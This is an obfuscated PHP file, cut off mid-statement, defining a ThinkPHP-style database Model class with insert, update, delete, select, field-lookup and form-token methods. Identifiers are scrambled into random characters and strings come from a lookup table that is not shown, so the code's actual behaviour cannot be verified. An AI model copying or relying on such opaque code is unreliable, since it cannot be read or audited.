<?php
 goto b¥¶ĞÔ»àÓ; d«Â¨çî: define($_SERVER[œ—üé‹ê][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\157\162\144\x65\x72", "\x61\x6c\151\141\x73", "\x68\x61\x76\151\156\x67", "\x67\x72\157\165\x70", "\154\157\x63\x6b", "\144\x69\x73\x74\x69\x6e\x63\x74", "\x61\x75\164\x6f", "\x66\x69\x6c\x74\x65\162", "\166\141\154\x69\144\x61\164\145", "\162\x65\x73\x75\x6c\164", "\x62\x69\156\144", "\x74\157\x6b\x65\156"); public function __construct($öíª´úé = '', $°éÊÀƒ‡ = '', $û­Ùî°ó = '') { $ÒšÈ†š· =& $_SERVER[œ—üé‹ê]; $this->_initialize(); if (!empty($öíª´úé)) { if (strpos($öíª´úé, $ÒšÈ†š·[10])) { list($this->dbName, $this->name) = explode($ÒšÈ†š·[10], $öíª´úé); } else { $this->name = $öíª´úé; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($°éÊÀƒ‡)) { $this->tablePrefix = $ÒšÈ†š·[12]; } elseif ($ÒšÈ†š·[12] != $°éÊÀƒ‡) { $this->tablePrefix = $°éÊÀƒ‡; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÒšÈ†š·[321]); } $this->db(0, empty($this->connection) ? $û­Ùî°ó : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ºï‹£ =& $_SERVER[œ—üé‹ê]; if (empty($this->fields)) { if (think_config($ºï‹£[322])) { $ˆ£”ëÒÁ = $this->dbName ? $this->dbName : think_config($ºï‹£[323]); $½±†ï™¾ = think_var_cache($ºï‹£[324] . strtolower(get_path_this($ˆ£”ëÒÁ) . $ºï‹£[10] . $this->name)); if ($½±†ï™¾) { $À›—“ïê = think_config($ºï‹£[325]); if (empty($À›—“ïê) || $½±†ï™¾[$ºï‹£[326]] == $À›—“ïê) { $this->fields = $½±†ï™¾; return; } } } $this->flush(); } } public function flush() { $Ãâ˜ÈÃ° =& $_SERVER[œ—üé‹ê]; $this->db->setModel($this->name); $³ÓªèÛ = $this->db->getFields($this->getTableName()); if (!$³ÓªèÛ) { return !1; } $this->fields = array_keys($³ÓªèÛ); $this->fields[$Ãâ˜ÈÃ°[327]] = !1; foreach ($³ÓªèÛ as $‘ò¢ã« => $ÉÂ”·•˜) { $¤€ŞĞ‹×[$‘ò¢ã«] = $ÉÂ”·•˜[$Ãâ˜ÈÃ°[33]]; if ($ÉÂ”·•˜[$Ãâ˜ÈÃ°[39]]) { $this->fields[$Ãâ˜ÈÃ°[328]] = $‘ò¢ã«; if ($ÉÂ”·•˜[$Ãâ˜ÈÃ°[42]]) { $this->fields[$Ãâ˜ÈÃ°[327]] = !0; } } } $this->fields[$Ãâ˜ÈÃ°[329]] = $¤€ŞĞ‹×; if (think_config($Ãâ˜ÈÃ°[325])) { $this->fields[$Ãâ˜ÈÃ°[326]] = think_config($Ãâ˜ÈÃ°[325]); } if (think_config($Ãâ˜ÈÃ°[322])) { $¯¸ûá÷ = $this->dbName ? $this->dbName : think_config($Ãâ˜ÈÃ°[323]); think_var_cache($Ãâ˜ÈÃ°[324] . strtolower(get_path_this($¯¸ûá÷) . $Ãâ˜ÈÃ°[10] . $this->name), $this->fields); } } public function switchModel($Ã“§³½É, $ÒïÉ´ò = array()) { $™ÂÍ–´½ =& $_SERVER[œ—üé‹ê]; $ÌÜö£©¾ = ucwords(strtolower($Ã“§³½É)) . $™ÂÍ–´½[330]; if (!class_exists($ÌÜö£©¾)) { think_exception($ÌÜö£©¾ . think_lang($™ÂÍ–´½[331])); } $this->_extModel = new $ÌÜö£©¾($this->name); if (!empty($ÒïÉ´ò)) { foreach ($ÒïÉ´ò as $Ôš¡ÌÎÛ) { $this->_extModel->setProperty($Ôš¡ÌÎÛ, $this->{$Ôš¡ÌÎÛ}); } } return $this->_extModel; } public function __set($¨„ºµâ´, $ºÂèî›Ò) { $this->data[$¨„ºµâ´] = $ºÂèî›Ò; } public function __get($‚ÉÖ‡Œ) { return isset($this->data[$‚ÉÖ‡Œ]) ? $this->data[$‚ÉÖ‡Œ] : null; } public function __isset($ïê©ŠÒæ) { return isset($this->data[$ïê©ŠÒæ]); } public function __unset($ò«£¸ïš) { unset($this->data[$ò«£¸ïš]); } public function __call($ÔëëÈñô, $ÌŒ¶ıêè) { $½¿–ÊÙ =& $_SERVER[œ—üé‹ê]; if (in_array(strtolower($ÔëëÈñô), $this->methods, !0)) { $this->options[strtolower($ÔëëÈñô)] = $ÌŒ¶ıêè[0]; return $this; } elseif (in_array(strtolower($ÔëëÈñô), array($½¿–ÊÙ[332], $½¿–ÊÙ[333], $½¿–ÊÙ[334], $½¿–ÊÙ[335], $½¿–ÊÙ[336]), !0)) { $ïá„®´é = isset($ÌŒ¶ıêè[0]) ? $ÌŒ¶ıêè[0] : $½¿–ÊÙ[220]; $ïá„®´é = $this->db->parseKey($ïá„®´é); return $this->getField(strtoupper($ÔëëÈñô) . $½¿–ÊÙ[337] . $ïá„®´é . $½¿–ÊÙ[338] . $ÔëëÈñô, $½¿–ÊÙ[332]); } elseif (strtolower(substr($ÔëëÈñô, 0, 5)) == $½¿–ÊÙ[339]) { $ïá„®´é = think_parse_name(substr($ÔëëÈñô, 5)); $¦ˆ¿ƒ’[$ïá„®´é] = $ÌŒ¶ıêè[0]; return $this->where($¦ˆ¿ƒ’)->find(); } elseif (strtolower(substr($ÔëëÈñô, 0, 10)) == $½¿–ÊÙ[340]) { $¬³ğ¢çÉ = think_parse_name(substr($ÔëëÈñô, 10)); $¦ˆ¿ƒ’[$¬³ğ¢çÉ] = $ÌŒ¶ıêè[0]; return $this->where($¦ˆ¿ƒ’)->getField($ÌŒ¶ıêè[1]); } elseif (isset($this->_scope[$ÔëëÈñô])) { return $this->scope($ÔëëÈñô, $ÌŒ¶ıêè[0]); } elseif (method_exists($this, $ÔëëÈñô) || method_exists($this, $½¿–ÊÙ[341] . $ÔëëÈñô)) { array_unshift($ÌŒ¶ıêè, $ÔëëÈñô); return call_user_func_array(array($this, $½¿–ÊÙ[342]), $ÌŒ¶ıêè); } else { return call_user_func_array(array(parent, $ÔëëÈñô), $ÌŒ¶ıêè); } } protected function call() { $†¯Ç¾²Ú =& $_SERVER[œ—üé‹ê]; $’Â·‡‡€ = func_get_args(); $³ÚÂ¥şú = array_shift($’Â·‡‡€); $·”ï¸ñ = $³ÚÂ¥şú; if (is_array($³ÚÂ¥şú)) { $·”ï¸ñ = $³ÚÂ¥şú[1]; $³ÚÂ¥şú = $³ÚÂ¥şú[0]; } $î÷·¸×à = count($’Â·‡‡€) - 1; if (isset($’Â·‡‡€[$î÷·¸×à]) && $’Â·‡‡€[$î÷·¸×à] === $³ÚÂ¥şú) { think_exception(__CLASS__ . $†¯Ç¾²Ú[4] . $³ÚÂ¥şú . think_lang($†¯Ç¾²Ú[343])); return; } $’Â·‡‡€[] = $³ÚÂ¥şú; if (method_exists($this, $†¯Ç¾²Ú[344])) { $„¸Œ‡® = call_user_func_array(array($this, $†¯Ç¾²Ú[345]), array($·”ï¸ñ, $’Â·‡‡€)); if (!is_null($„¸Œ‡®) && $„¸Œ‡® !== !1) { return $„¸Œ‡®; } } $ÁşƒªÅ = !1; if (method_exists($this, $³ÚÂ¥şú)) { $ÁşƒªÅ = call_user_func_array(array($this, $³ÚÂ¥şú), $’Â·‡‡€); } if (method_exists($this, $†¯Ç¾²Ú[346])) { $„¸Œ‡® = call_user_func_array(array($this, $†¯Ç¾²Ú[347]), array($·”ï¸ñ, $’Â·‡‡€, $ÁşƒªÅ)); if ($„¸Œ‡®) { return $„¸Œ‡®; } } return $ÁşƒªÅ; } protected function _initialize() { } protected function _facade($¢½Ú¢äÔ) { $¹³˜Õğ =& $_SERVER[œ—üé‹ê]; if (!empty($this->fields)) { foreach ($¢½Ú¢äÔ as $ûï˜÷«ã => $ˆÜ¬¬Ó) { if (is_array($this->fields) && !in_array($ûï˜÷«ã, $this->fields, !0)) { unset($¢½Ú¢äÔ[$ûï˜÷«ã]); } elseif (is_scalar($ˆÜ¬¬Ó)) { $this->_parseType($¢½Ú¢äÔ, $ûï˜÷«ã); } } } if (!empty($this->options[$¹³˜Õğ[348]])) { $¢½Ú¢äÔ = array_map($this->options[$¹³˜Õğ[348]], $¢½Ú¢äÔ); unset($this->options[$¹³˜Õğ[348]]); } $this->_beforeWrite($¢½Ú¢äÔ); return $¢½Ú¢äÔ; } protected function _beforeWrite(&$ßúçĞ) { } public function add($İ³ÕÎ¹Û = '', $‘ˆæ´Á = array(), $ÖÇÙƒ—¿ = false) { if (empty($İ³ÕÎ¹Û)) { if (!empty($this->data)) { $İ³ÕÎ¹Û = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[œ—üé‹ê][349]); return !1; } } $‘ˆæ´Á = $this->_parseOptions($‘ˆæ´Á); $İ³ÕÎ¹Û = $this->_facade($İ³ÕÎ¹Û); if (!1 === $this->_beforeInsert($İ³ÕÎ¹Û, $‘ˆæ´Á)) { return !1; } $¨°îµæ¢ = $this->db->insert($İ³ÕÎ¹Û, $‘ˆæ´Á, $ÖÇÙƒ—¿); if (!1 !== $¨°îµæ¢) { $ Şùó…ó = $this->getLastInsID(); if ($ Şùó…ó) { $İ³ÕÎ¹Û[$this->getPk()] = $ Şùó…ó; $this->_after_insert($İ³ÕÎ¹Û, $‘ˆæ´Á); return $ Şùó…ó; } $this->_after_insert($İ³ÕÎ¹Û, $‘ˆæ´Á); } return $¨°îµæ¢; } protected function _beforeInsert(&$æİ¼Òê, $—¾ÚÀ·ß) { } protected function _after_insert($üÏÒïŞ, $Á´»ø—) { } public function addAll($¶ìÄÏ, $ê„±óí² = array(), $ÁØåéŠ« = false) { $üÕ„Ôù“ =& $_SERVER[œ—üé‹ê]; if (empty($¶ìÄÏ)) { $this->error = think_lang($üÕ„Ôù“[349]); return !1; } $ê„±óí² = $this->_parseOptions($ê„±óí²); foreach ($¶ìÄÏ as $¶°ú®³ => $»›ÆÒ™) { $¶ìÄÏ[$¶°ú®³] = $this->_facade($»›ÆÒ™); } if (method_exists($this->db, $üÕ„Ôù“[350])) { $ş¨†¶… = $this->db->insertAll($¶ìÄÏ, $ê„±óí², $ÁØåéŠ«); } else { $this->startTrans(); foreach ($¶ìÄÏ as $¶°ú®³ => $»›ÆÒ™) { $ş¨†¶… = $this->db->insert($»›ÆÒ™, $ê„±óí², $ÁØåéŠ«); } $this->commit(); } if (!1 !== $ş¨†¶…) { $öÌ¥®ôè = $this->getLastInsID(); if ($öÌ¥®ôè) { return $öÌ¥®ôè; } } return $ş¨†¶…; } public function selectAdd($’ë‰†øÅ = '', $™ıï€… = '', $Ø³¸î‚ë = array()) { $ºÈ¶û¹§ =& $_SERVER[œ—üé‹ê]; $Ø³¸î‚ë = $this->_parseOptions($Ø³¸î‚ë); if (!1 === ($ôÕˆöƒÍ = $this->db->selectInsert($’ë‰†øÅ ? $’ë‰†øÅ : $Ø³¸î‚ë[$ºÈ¶û¹§[351]], $™ıï€… ? $™ıï€… : $this->getTableName(), $Ø³¸î‚ë))) { $this->error = think_lang($ºÈ¶û¹§[352]); return !1; } else { return $ôÕˆöƒÍ; } } public function save($ÑÊä¬Í = '', $Õ¯í”„ = array()) { $¡“ß®ğÓ =& $_SERVER[œ—üé‹ê]; if (empty($ÑÊä¬Í)) { if (!empty($this->data)) { $ÑÊä¬Í = $this->data; $this->data = array(); } else { $this->error = think_lang($¡“ß®ğÓ[349]); return !1; } } $ÑÊä¬Í = $this->_facade($ÑÊä¬Í); $Õ¯í”„ = $this->_parseOptions($Õ¯í”„); $âıİŠçÃ = $this->getPk(); if (!isset($Õ¯í”„[$¡“ß®ğÓ[353]])) { if (isset($ÑÊä¬Í[$âıİŠçÃ])) { $²äï³Ğ™[$âıİŠçÃ] = $ÑÊä¬Í[$âıİŠçÃ]; $Õ¯í”„[$¡“ß®ğÓ[353]] = $²äï³Ğ™; unset($ÑÊä¬Í[$âıİŠçÃ]); } else { $this->error = think_lang($¡“ß®ğÓ[352]); return !1; } } if (is_array($Õ¯í”„[$¡“ß®ğÓ[353]]) && isset($Õ¯í”„[$¡“ß®ğÓ[353]][$âıİŠçÃ])) { $÷äëÙÖ¶ = $Õ¯í”„[$¡“ß®ğÓ[353]][$âıİŠçÃ]; } if (!1 === $this->_beforeUpdate($ÑÊä¬Í, $Õ¯í”„)) { return !1; } $¬™â€ « = $this->db->update($ÑÊä¬Í, $Õ¯í”„); if (!1 !== $¬™â€ «) { if (isset($÷äëÙÖ¶)) { $ÑÊä¬Í[$âıİŠçÃ] = $÷äëÙÖ¶; } $this->_afterUpdate($ÑÊä¬Í, $Õ¯í”„); } return $¬™â€ «; } protected function _beforeUpdate(&$³çşí€ñ, $ˆ½ƒâôæ) { } protected function _afterUpdate($©Â¼Ü¬‘, $Ì¦ñ—Ö£) { } public function delete($â°êÇ™ = array()) { $ù¢÷´ÎŸ =& $_SERVER[œ—üé‹ê]; if (empty($â°êÇ™) && empty($this->options[$ù¢÷´ÎŸ[353]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $çµú¢ö  = $this->getPk(); if (is_numeric($â°êÇ™) || is_string($â°êÇ™)) { if (strpos($â°êÇ™, $ù¢÷´ÎŸ[50])) { $•¹ğÌ ­[$çµú¢ö ] = array($ù¢÷´ÎŸ[354], $â°êÇ™); } else { $•¹ğÌ ­[$çµú¢ö ] = $â°êÇ™; } $this->options[$ù¢÷´ÎŸ[353]] = $•¹ğÌ ­; } $â°êÇ™ = $this->_parseOptions(); if (is_array($â°êÇ™[$ù¢÷´ÎŸ[353]]) && isset($â°êÇ™[$ù¢÷´ÎŸ[353]][$çµú¢ö ])) { $ŸøàŞÊ– = $â°êÇ™[$ù¢÷´ÎŸ[353]][$çµú¢ö ]; } $¾ºì«Ğ‰ = $this->db->delete($â°êÇ™); if (!1 !== $¾ºì«Ğ‰) { $¹½Ş«Ê = array(); if (isset($ŸøàŞÊ–)) { $¹½Ş«Ê[$çµú¢ö ] = $ŸøàŞÊ–; } $this->_after_delete($¹½Ş«Ê, $â°êÇ™); } return $¾ºì«Ğ‰; } protected function _after_delete($º©º…ğ¸, $©‡‹Í•ğ) { } public function select($ªşå‡ô = array()) { $¢‡ª€˜À =& $_SERVER[œ—üé‹ê]; if (is_string($ªşå‡ô) || is_numeric($ªşå‡ô)) { $ØÜÚªÙ¸ = $this->getPk(); if (strpos($ªşå‡ô, $¢‡ª€˜À[50])) { $—Öå•¯á[$ØÜÚªÙ¸] = array($¢‡ª€˜À[354], $ªşå‡ô); } else { $—Öå•¯á[$ØÜÚªÙ¸] = $ªşå‡ô; } $this->options[$¢‡ª€˜À[353]] = $—Öå•¯á; } elseif (!1 === $ªşå‡ô) { $ªşå‡ô = $this->_parseOptions(); return $¢‡ª€˜À[355] . $this->db->buildSelectSql($ªşå‡ô) . $¢‡ª€˜À[356]; } $ªşå‡ô = $this->_parseOptions(); $á¿Á¡‡ = $this->db->select($ªşå‡ô); if (!1 === $á¿Á¡‡) { return !1; } if (empty($á¿Á¡‡)) { return null; } $this->_afterSelect($á¿Á¡‡, $ªşå‡ô); return $á¿Á¡‡; } protected function _afterSelect(&$£ç±²¶¼, $©é±Ğ³¶) { } public function buildSql($¥¿›©Ò = array()) { $æ‡ÉÂØÓ =& $_SERVER[œ—üé‹ê]; $¥¿›©Ò = $this->_parseOptions($¥¿›©Ò); return $æ‡ÉÂØÓ[355] . $this->db->buildSelectSql($¥¿›©Ò) . $æ‡ÉÂØÓ[356]; } public function optionsValue($…Ê©®”ˆ = null) { if (is_null($…Ê©®”ˆ)) { return $this->options; } elseif (is_array($…Ê©®”ˆ)) { $this->options = array_merge($this->options, $…Ê©®”ˆ); } } protected function _parseOptions($üƒÕ†úñ = array()) { $®ëÈ³ß =& $_SERVER[œ—üé‹ê]; if (is_array($üƒÕ†úñ)) { $üƒÕ†úñ = array_merge($this->options, $üƒÕ†úñ); } $this->options = array(); if (!isset($üƒÕ†úñ[$®ëÈ³ß[357]])) { $üƒÕ†úñ[$®ëÈ³ß[357]] = $this->getTableName(); $òØ×¼§ = $this->fields; } else { $òØ×¼§ = $this->getDbFields(); } if (!empty($üƒÕ†úñ[$®ëÈ³ß[358]])) { $üƒÕ†úñ[$®ëÈ³ß[357]] .= $®ëÈ³ß[53] . $üƒÕ†úñ[$®ëÈ³ß[358]]; } $üƒÕ†úñ[$®ëÈ³ß[359]] = $this->name; if (isset($üƒÕ†úñ[$®ëÈ³ß[353]]) && is_array($üƒÕ†úñ[$®ëÈ³ß[353]]) && !empty($òØ×¼§) && !isset($üƒÕ†úñ[$®ëÈ³ß[360]]) && !isset($üƒÕ†úñ[$®ëÈ³ß[357]])) { foreach ($üƒÕ†úñ[$®ëÈ³ß[353]] as $­£­ÂàÏ => $›Á¶°ãİ) { $­£­ÂàÏ = trim($­£­ÂàÏ); if (in_array($­£­ÂàÏ, $òØ×¼§, !0)) { if (is_scalar($›Á¶°ãİ)) { $this->_parseType($üƒÕ†úñ[$®ëÈ³ß[353]], $­£­ÂàÏ); } } elseif (!is_numeric($­£­ÂàÏ) && $®ëÈ³ß[11] != substr($­£­ÂàÏ, 0, 1) && !1 === strpos($­£­ÂàÏ, $®ëÈ³ß[10]) && !1 === strpos($­£­ÂàÏ, $®ëÈ³ß[337]) && !1 === strpos($­£­ÂàÏ, $®ëÈ³ß[212]) && !1 === strpos($­£­ÂàÏ, $®ëÈ³ß[284])) { unset($üƒÕ†úñ[$®ëÈ³ß[353]][$­£­ÂàÏ]); } } } $this->_options_filter($üƒÕ†úñ); return $üƒÕ†úñ; } protected function _options_filter(&$òœ€¢™) { } protected function _parseType(&$¯¦÷ÖÆæ, $îî•Ù®æ) { $ßä©ô…Ñ =& $_SERVER[œ—üé‹ê]; if (empty($this->options[$ßä©ô…Ñ[361]][$ßä©ô…Ñ[4] . $îî•Ù®æ])) { $ş˜ÊÊ€ = strtolower($this->fields[$ßä©ô…Ñ[329]][$îî•Ù®æ]); if (!1 !== strpos($ş˜ÊÊ€, $ßä©ô…Ñ[362])) { } elseif (!1 === strpos($ş˜ÊÊ€, $ßä©ô…Ñ[363]) && !1 !== strpos($ş˜ÊÊ€, $ßä©ô…Ñ[364])) { $¯¦÷ÖÆæ[$îî•Ù®æ] = intval($¯¦÷ÖÆæ[$îî•Ù®æ]); } elseif (!1 !== strpos($ş˜ÊÊ€, $ßä©ô…Ñ[365]) || !1 !== strpos($ş˜ÊÊ€, $ßä©ô…Ñ[366])) { $¯¦÷ÖÆæ[$îî•Ù®æ] = floatval($¯¦÷ÖÆæ[$îî•Ù®æ]); } elseif (!1 !== strpos($ş˜ÊÊ€, $ßä©ô…Ñ[367])) { $¯¦÷ÖÆæ[$îî•Ù®æ] = (bool) $¯¦÷ÖÆæ[$îî•Ù®æ]; } } } public function find($œ¨Ìñ = array()) { $å‡Êåò =& $_SERVER[œ—üé‹ê]; if (is_numeric($œ¨Ìñ) || is_string($œ¨Ìñ)) { $ØÆÈÌÇ¥[$this->getPk()] = intval($œ¨Ìñ); $this->options[$å‡Êåò[353]] = $ØÆÈÌÇ¥; } $this->options[$å‡Êåò[368]] = 1; $œ¨Ìñ = $this->_parseOptions(); $¼£‡ªà« = $this->db->select($œ¨Ìñ); if (!1 === $¼£‡ªà«) { return !1; } if (empty($¼£‡ªà«)) { return null; } $÷š¦›ÍÒ = $¼£‡ªà«[0]; $this->_afterFind($÷š¦›ÍÒ, $œ¨Ìñ); return $÷š¦›ÍÒ; } protected function _afterFind(&$ÏûØæ¼ü, $ÇöŒ´È) { } protected function returnResult($İ«­—™, $Ëì›Ÿß« = '') { $šÔÖ¥È® =& $_SERVER[œ—üé‹ê]; if ($Ëì›Ÿß«) { if (is_callable($Ëì›Ÿß«)) { return call_user_func($Ëì›Ÿß«, $İ«­—™); } switch (strtolower($Ëì›Ÿß«)) { case $šÔÖ¥È®[369]: return json_encode($İ«­—™); case $šÔÖ¥È®[370]: return xml_encode($İ«­—™); } } return $İ«­—™; } public function parseFieldsMap($úœÉ‚½, $¯’ÅŸø¦ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $‰¸Şƒ±š => $«§¢ù˜) { if ($¯’ÅŸø¦ == 1) { if (isset($úœÉ‚½[$«§¢ù˜])) { $úœÉ‚½[$‰¸Şƒ±š] = $úœÉ‚½[$«§¢ù˜]; unset($úœÉ‚½[$«§¢ù˜]); } } else { if (isset($úœÉ‚½[$‰¸Şƒ±š])) { $úœÉ‚½[$«§¢ù˜] = $úœÉ‚½[$‰¸Şƒ±š]; unset($úœÉ‚½[$‰¸Şƒ±š]); } } } } return $úœÉ‚½; } public function setField($éûú”†³, $‘µ¼Íğ¾ = '') { if (is_array($éûú”†³)) { $Á‘îæ”ì = $éûú”†³; } else { $Á‘îæ”ì[$éûú”†³] = $‘µ¼Íğ¾; } return $this->save($Á‘îæ”ì); } public function setAdd($¾ö¤—¶¨, $Î¨çñ¶Ú = 1) { $üˆÉÊé =& $_SERVER[œ—üé‹ê]; $ı¶…×‚” = $¾ö¤—¶¨ . $üˆÉÊé[371] . $Î¨çñ¶Ú; if ($Î¨çñ¶Ú < 0) { $ı¶…×‚” = $¾ö¤—¶¨ . $Î¨çñ¶Ú; } return $this->setField($¾ö¤—¶¨, array($üˆÉÊé[372], $ı¶…×‚”)); } public function getField($ØïË³º«, $±á÷í¯” = null) { $®ä“¬™Ê =& $_SERVER[œ—üé‹ê]; $š¶˜ì¾[$®ä“¬™Ê[351]] = $ØïË³º«; $š¶˜ì¾ = $this->_parseOptions($š¶˜ì¾); $ØïË³º« = trim($ØïË³º«); if (strpos($ØïË³º«, $®ä“¬™Ê[50])) { if (!isset($š¶˜ì¾[$®ä“¬™Ê[368]])) { $š¶˜ì¾[$®ä“¬™Ê[368]] = is_numeric($±á÷í¯”) ? $±á÷í¯” : $®ä“¬™Ê[12]; } $Ã½ˆğß = $this->db->select($š¶˜ì¾); if (!empty($Ã½ˆğß)) { $±Şı£‰ = explode($®ä“¬™Ê[50], $ØïË³º«); $ØïË³º« = array_keys($Ã½ˆğß[0]); $§ü·ø¦È = array_shift($ØïË³º«); $§Å›çÉ¹ = array_shift($ØïË³º«); $é¬¨µİÕ = array(); $Ë‹üì²¸ = count($±Şı£‰); foreach ($Ã½ˆğß as $ÁÜ ¬˜Ê) { $Œ …Á™Î = $ÁÜ ¬˜Ê[$§ü·ø¦È]; if (2 == $Ë‹üì²¸) { $é¬¨µİÕ[$Œ …Á™Î] = $ÁÜ ¬˜Ê[$§Å›çÉ¹]; } else { $é¬¨µİÕ[$Œ …Á™Î] = is_string($±á÷í¯”) ? implode($±á÷í¯”, $ÁÜ ¬˜Ê) : $ÁÜ ¬˜Ê; } } return $é¬¨µİÕ; } } else { if (!0 !== $±á÷í¯”) { $š¶˜ì¾[$®ä“¬™Ê[368]] = is_numeric($±á÷í¯”) ? $±á÷í¯” : 1; } if ($±á÷í¯” === $®ä“¬™Ê[332]) { unset($š¶˜ì¾[$®ä“¬™Ê[368]]); } $ÁÜ ¬˜Ê = $this->db->select($š¶˜ì¾); if (!empty($ÁÜ ¬˜Ê)) { if ($±á÷í¯” === $®ä“¬™Ê[332]) { return reset($ÁÜ ¬˜Ê[0]); } if (!0 !== $±á÷í¯” && 1 == $š¶˜ì¾[$®ä“¬™Ê[368]]) { return reset($ÁÜ ¬˜Ê[0]); } foreach ($ÁÜ ¬˜Ê as $ì”Ûæ¯÷) { $á’ˆš„Ó[] = $ì”Ûæ¯÷[$ØïË³º«]; } return $á’ˆš„Ó; } } return null; } public function create($ªè°Æ­ = '', $ğü§ô·Ó = '') { $ÀÈ­Ş…ö =& $_SERVER[œ—üé‹ê]; if (empty($ªè°Æ­)) { $ªè°Æ­ = $_POST; } elseif (is_object($ªè°Æ­)) { $ªè°Æ­ = get_object_vars($ªè°Æ­); } if (empty($ªè°Æ­) || !is_array($ªè°Æ­)) { $this->error = think_lang($ÀÈ­Ş…ö[349]); return !1; } $ªè°Æ­ = $this->parseFieldsMap($ªè°Æ­, 0); $ğü§ô·Ó = $ğü§ô·Ó ? $ğü§ô·Ó : (!empty($ªè°Æ­[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÀÈ­Ş…ö[351]])) { $Ÿ”»ôÂ÷ = $this->options[$ÀÈ­Ş…ö[351]]; unset($this->options[$ÀÈ­Ş…ö[351]]); } elseif ($ğü§ô·Ó == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ÿ”»ôÂ÷ = $this->insertFields; } elseif ($ğü§ô·Ó == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ÿ”»ôÂ÷ = $this->updateFields; } if (isset($Ÿ”»ôÂ÷)) { if (is_string($Ÿ”»ôÂ÷)) { $Ÿ”»ôÂ÷ = explode($ÀÈ­Ş…ö[50], $Ÿ”»ôÂ÷); } if (think_config($ÀÈ­Ş…ö[373])) { $Ÿ”»ôÂ÷[] = think_config($ÀÈ­Ş…ö[374]); } foreach ($ªè°Æ­ as $º¬€ÌÕ => $†òÉ¨†ç) { if (!in_array($º¬€ÌÕ, $Ÿ”»ôÂ÷)) { unset($ªè°Æ­[$º¬€ÌÕ]); } } } if (!$this->autoValidation($ªè°Æ­, $ğü§ô·Ó)) { return !1; } if (!$this->autoCheckToken($ªè°Æ­)) { $this->error = think_lang($ÀÈ­Ş…ö[375]); return !1; } if ($this->autoCheckFields) { $Ÿ”»ôÂ÷ = $this->getDbFields(); foreach ($ªè°Æ­ as $º¬€ÌÕ => $†òÉ¨†ç) { if (!in_array($º¬€ÌÕ, $Ÿ”»ôÂ÷)) { unset($ªè°Æ­[$º¬€ÌÕ]); } elseif (MAGIC_QUOTES_GPC && is_string($†òÉ¨†ç)) { $ªè°Æ­[$º¬€ÌÕ] = stripslashes($†òÉ¨†ç); } } } $this->autoOperation($ªè°Æ­, $ğü§ô·Ó); $this->data = $ªè°Æ­; return $ªè°Æ­; } public function autoCheckToken($ÕåŠ¤‡½) { $ãÌñ¶à¹ =& $_SERVER[œ—üé‹ê]; if (isset($this->options[$ãÌñ¶à¹[376]]) && !$this->options[$ãÌñ¶à¹[376]]) { return !0; } if (think_config($ãÌñ¶à¹[373])) { $éë›ÍÕ³ = think_config($ãÌñ¶à¹[374]); if (!isset($ÕåŠ¤‡½[$éë›ÍÕ³]) || Session::get($éë›ÍÕ³)) { return !1; } list($ïË©’ä, $üÂº¥×Ñ) = explode($ãÌñ¶à¹[11], $ÕåŠ¤‡½[$éë›ÍÕ³]); if ($üÂº¥×Ñ && Session::get($éë›ÍÕ³ . $ãÌñ¶à¹[10] . $ïË©’ä) === $üÂº¥×Ñ) { Session::remove($éë›ÍÕ³ . $ãÌñ¶à¹[10] . $ïË©’ä); return !0; } if (think_config($ãÌñ¶à¹[377])) { Session::remove($éë›ÍÕ³ . $ãÌñ¶à¹[10] . $ïË©’ä); } return !1; } return !0; } public function regex($Û¹‚º£Ê, $ÄŠôÈ…ó) { $ôãˆ­Ñü =& $_SERVER[œ—üé‹ê]; $Ç˜Äõ…… = array($ôãˆ­Ñü[378] => $ôãˆ­Ñü[379], $ôãˆ­Ñü[380] => $ôãˆ­Ñü[381], $ôãˆ­Ñü[382] => $ôãˆ­Ñü[383], $ôãˆ­Ñü[384] => $ôãˆ­Ñü[385], $ôãˆ­Ñü[386] => $ôãˆ­Ñü[387], $ôãˆ­Ñü[388] => $ôãˆ­Ñü[389], $ôãˆ­Ñü[390] => $ôãˆ­Ñü[391], $ôãˆ­Ñü[366] => $ôãˆ­Ñü[392], $ôãˆ­Ñü[393] => $ôãˆ­Ñü[394]); if (isset($Ç˜Äõ……[strtolower($ÄŠôÈ…ó)])) { $ÄŠôÈ…ó = $Ç˜Äõ……[strtolower($ÄŠôÈ…ó)]; } return preg_match($ÄŠôÈ…ó, $Û¹‚º£Ê) === 1; } private function autoOperation(&$¸ÊŞü“¹, $Üç›ï¾¡) { $‘ÁêÅ =& $_SERVER[œ—üé‹ê]; if (!empty($this->options[$‘ÁêÅ[395]])) { $Ÿ¶˜é¡¬ = $this->options[$‘ÁêÅ[395]]; unset($this->options[$‘ÁêÅ[395]]); } elseif (!empty($this->_auto)) { $Ÿ¶˜é¡¬ = $this->_auto; } if (isset($Ÿ¶˜é¡¬)) { foreach ($Ÿ¶˜é¡¬ as $â›ŠÆñ) { if (empty($â›ŠÆñ[2])) { $â›ŠÆñ[2] = THINK_MODEL_INSERT; } if ($Üç›ï¾¡ == $â›ŠÆñ[2] || $â›ŠÆñ[2] == THINK_MODEL_BOTH) { switch (trim($â›ŠÆñ[3])) { case $‘ÁêÅ[396]: case $‘ÁêÅ[397]: $Óš¢Åé = isset($â›ŠÆñ[4]) ? (array) $â›ŠÆñ[4] : array(); if (isset($¸ÊŞü“¹[$â›ŠÆñ[0]])) { array_unshift($Óš¢Åé, $¸ÊŞü“¹[$â›ŠÆñ[0]]); } if ($‘ÁêÅ[396] == $â›ŠÆñ[3]) { $¸ÊŞü“¹[$â›ŠÆñ[0]] = call_user_func_array($â›ŠÆñ[1], $Óš¢Åé); } else { $¸ÊŞü“¹[$â›ŠÆñ[0]] = call_user_func_array(array(&$this, 